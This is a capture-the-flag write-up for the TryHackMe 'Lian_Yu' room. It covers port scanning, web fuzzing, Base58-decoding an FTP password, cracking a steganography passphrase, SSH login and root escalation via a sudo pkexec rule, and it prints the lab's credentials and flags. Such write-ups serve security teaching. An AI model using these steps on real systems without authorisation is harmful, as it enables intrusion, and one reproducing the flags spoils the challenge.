# Lian_Yu
![tryhackme_logo](https://user-images.githubusercontent.com/83867734/185771149-cb02c6f2-8476-4ab3-a626-cca8db0a08bf.png)

Difficulty: **Easy**

Compromise the machine and read the user.txt and root.txt.

Tags
--
* Fuzzing
* Base58
* FTP
* Steganography
* SSH 
* Sudoers

Tools used
--
* nmap
* ffuf
* ftp
* steghide
* stegseek
* ssh
* pkexec

Machines
--
Attacker:
* Name: attacker_machine
* Operating System: Athena OS
* IP Address: 10.18.98.39

Victim:
* Name: victim_machine
* IP Address: 10.10.97.205
* Other information must be gathered during the attack

## Phase 1: Enumeration
```
sudo nmap -sS -sC -sV 10.10.97.205 -p- -T5 -vvv -g 53

<SNIP>
Discovered open port 80/tcp on 10.10.97.205
Discovered open port 21/tcp on 10.10.97.205
Discovered open port 111/tcp on 10.10.97.205
Discovered open port 22/tcp on 10.10.97.205
Discovered open port 54542/tcp on 10.10.97.205
<SNIP>
```
Let's fuzz the web service:
```
ffuf -u http://10.10.97.205/FFUF -H 'Host: 10.10.97.205' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv
:91.0) Gecko/20100101 Firefox/91.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-La
nguage: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'DNT: 1' -H 
'Sec-GPC: 1' -w $SECLISTS/Discovery/Web-Content/directory-list-2.3-small.txt:FFUF

island                  [Status: 301, Size: 235, Words: 14, Lines: 8, Duration: 117ms]
```
In the index of this directory there is the following content:
```
Ohhh Noo, Don't Talk...............

I wasn't Expecting You at this Moment. I will meet you there

You should find a way to Lian_Yu as we are planed. The Code Word is:
vigilante
```
Let's fuzz the `island` directory:
```
ffuf -u http://10.10.97.205/island/FFUF -H 'Host: 10.10.97.205' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv
:91.0) Gecko/20100101 Firefox/91.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-La
nguage: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'DNT: 1' -H 
'Sec-GPC: 1' -w $SECLISTS/Discovery/Web-Content/directory-list-2.3-small.txt:FFUF

2100                    [Status: 301, Size: 240, Words: 14, Lines: 8, Duration: 44ms]
```
By accessing to it, we have the following content:
```
How Oliver Queen finds his way to Lian_Yu?

<YouTube video (no more available)>
```
In the source code of this page, there is a comment saying `<!-- you can avail your .ticket here but how?   -->`.

Let's fuzz again by searching for a file ending with `.ticket`:
```
ffuf -u http://10.10.97.205/island/2100/FFUF.ticket -H 'Host: 10.10.97.205' -H 'User-Agent: Mozilla/5.0 (X11; Linu
x x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -
H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 
'DNT: 1' -H 'Sec-GPC: 1' -w $SECLISTS/Discovery/Web-Content/directory-list-2.3-small.txt:FFUF

green_arrow             [Status: 200, Size: 71, Words: 10, Lines: 7, Duration: 53ms]
```
By accessing on it, we get the following message:
```
This is just a token to get into Queen's Gambit(Ship)

RTy8yhBQdscX
```
The ticket needs to be decoded as Base58 and we get `!#th3h00d`. It is the FTP password for the user `vigilante`.

## Phase 2: Foothold

Let's access to FTP by using the previous found credentials:
```
ftp 10.10.97.205 -n
Connected to 10.10.97.205.
220 (vsFTPd 3.0.2)
ftp> user
(username) vigilante
331 Please specify the password.
Password: !#th3h00d
230 Login successful.
```
In this FTP session, we can travel across the filesystem and we can see there is also another user: `slade`. For now, just get `aa.jpg` file in vigilante home folder. Usually JPG files can hide other files. When you are in FTP, be sure that the binary mode is set otherwise when we download files or images, they will be corrupted. For ensuring that, just write `binary` inside the FTP session:
```
ftp> binary
ftp> get aa.jpg
```
Note: maybe, if you use `ls`, FTP session switches from binary mode to ASCII mode.

Now let's crack the `aa.jpg` for getting the password to be used by steghide:
```
stegseek aa.jpg $SECLISTS/Passwords/Leaked-Databases/rockyou.txt

StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "password"
[i] Original filename: "ss.zip".
[i] Extracting to "aa.jpg.out".
```
Unzip `ss.zip` and we get two files: `passwd.txt`:
```
This is your visa to Land on Lian_Yu # Just for Fun ***


a small Note about it


Having spent years on the island, Oliver learned how to be resourceful and 
set booby traps all over the island in the common event he ran into dangerous
people. The island is also home to many animals, including pheasants,
wild pigs and wolves.
```
and `shado`:
```
M3tahuman
```
Let's use this password for connecting by SSH with the `slade` user:
```
ssh 10.10.97.205 -l slade
Enter password: M3tahuman

cat user.txt

THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}
			--Felicity Smoak
```

## Phase 3: Privilege Escalation
Run:
```
sudo -l

Matching Defaults entries for slade on LianYu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User slade may run the following commands on LianYu:
    (root) PASSWD: /usr/bin/pkexec
```
So, run the following:
```
sudo pkexec --user root cat root.txt

                          Mission accomplished

You are injected me with Mirakuru:) ---> Now slade Will become DEATHSTROKE. 

THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}
									     --DEATHSTROKE
```